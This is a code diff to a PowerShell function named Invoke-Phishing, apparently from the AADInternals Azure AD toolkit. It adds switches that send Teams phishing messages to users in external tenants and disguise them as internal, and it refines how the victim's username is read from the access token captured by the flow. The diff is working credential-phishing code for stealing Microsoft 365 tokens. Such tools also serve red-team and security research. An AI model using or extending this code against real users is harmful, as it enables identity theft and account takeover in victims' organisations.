@@ -1101,6 +1101,10 @@ function Invoke-Phishing
         [Switch]$Teams,
         [Parameter(ParameterSetName='Teams',Mandatory=$False)]
         [String]$CleanMessage='<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>',
+        [Parameter(ParameterSetName='Teams')]
+        [switch]$External,
+        [Parameter(ParameterSetName='Teams')]
+        [switch]$FakeInternal,
 
         [Parameter(ParameterSetName='Mail',Mandatory=$True)]
         [String]$Subject,
@@ -1126,26 +1130,35 @@ function Invoke-Phishing
             # Get access token from cache
             $AccessToken = Get-AccessTokenFromCache -AccessToken $AccessToken -Resource "https://management.core.windows.net/" -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c"
 
-            # Get the list of tenants the user has access to
-            $tenants = Get-AzureTenants -AccessToken $AccessToken
-            $tenantNames = $tenants | select -ExpandProperty Name
-
-            # Prompt for tenant choice if more than one
-            if($tenantNames.count -gt 1)
+            # If external, use the target tenant id
+            if($External)
             {
-                $options = [System.Management.Automation.Host.ChoiceDescription[]]@()
-                for($p=0; $p -lt $tenantNames.count; $p++)
-                {
-                    $options += New-Object System.Management.Automation.Host.ChoiceDescription "&$($choises[$p % $choises.Length]) $($tenantNames[$p])"
-                }
-                $opt = $host.UI.PromptForChoice("Choose the tenant","Choose the tenant to sent messages to",$options,0)
-                }
-            else
-            {
-                $opt=0
+                $Tenant = Get-AADIntTenantID -UserName $Recipients[0]
             }
-            $tenantInfo = $tenants[$opt]
-            $tenant =     $tenantInfo.Id
+
+            # Get the list of tenants the user has access to if not provided
+            if([string]::IsNullOrEmpty($Tenant))
+            {
+                $tenants = Get-AzureTenants -AccessToken $AccessToken
+                $tenantNames = $tenants | select -ExpandProperty Name
+
+                # Prompt for tenant choice if more than one
+                if($tenantNames.count -gt 1)
+                {
+                    $options = [System.Management.Automation.Host.ChoiceDescription[]]@()
+                    for($p=0; $p -lt $tenantNames.count; $p++)
+                    {
+                        $options += New-Object System.Management.Automation.Host.ChoiceDescription "&$($choises[$p % $choises.Length]) $($tenantNames[$p])"
+                    }
+                    $opt = $host.UI.PromptForChoice("Choose the tenant","Choose the tenant to sent messages to",$options,0)
+                }
+                else
+                {
+                    $opt=0
+                }
+                $tenantInfo = $tenants[$opt]
+                $tenant =     $tenantInfo.Id
+            }
 
             # Create a new AccessToken for graph.microsoft.com
             $refresh_token = $script:refresh_tokens["d3590ed6-52b3-4102-aeff-aad2292ab01c-https://management.core.windows.net/"]
@@ -1153,7 +1166,7 @@ function Invoke-Phishing
             {
                 throw "No refresh token found! Use Get-AADIntAccessTokenForAzureCoreManagement with -SaveToCache switch"
             }
-            $AccessToken = Get-AccessTokenWithRefreshToken -Resource "https://api.spaces.skype.com" -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -TenantId $tenant -RefreshToken $refresh_token -SaveToCache $true
+            $AccessToken = Get-AccessTokenWithRefreshToken -Resource "https://api.spaces.skype.com" -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" -TenantId (Read-AccessToken -AccessToken $AccessToken).tid -RefreshToken $refresh_token -SaveToCache $true
         }
 
         # Create a body for the first request. We'll be using client id of "Microsoft Office"
@@ -1177,8 +1190,8 @@ function Invoke-Phishing
         {
             if($Teams)
             {
-                $msgDetails = Send-TeamsMessage -AccessToken $AccessToken -Recipients $recipient -Message $Message -Html
-                Write-Host "Teams message sent to: $Recipients. Message id: $($msgDetails.MessageID)"
+                $msgDetails = Send-TeamsMessage -AccessToken $AccessToken -Recipients $recipient -Message $Message -Html -External $External -FakeInternal $FakeInternal
+                Write-Host "Teams message sent to: $Recipients. ClientMessageId: $($msgDetails.ClientMessageId)"
                 $msgDetails | Add-Member -NotePropertyName "Recipient" -NotePropertyValue $recipient
                 $teamsMessages += $msgDetails
             }
@@ -1245,6 +1258,10 @@ function Invoke-Phishing
 
         # Dump the name
         $user = (Read-Accesstoken -AccessToken $response.access_token).upn
+        if([String]::IsNullOrEmpty($user))
+        {
+            $user = (Read-Accesstoken -AccessToken $response.access_token).unique_name
+        }
         Write-Host "Received access token for $user"
 
         # Clear the teams messages
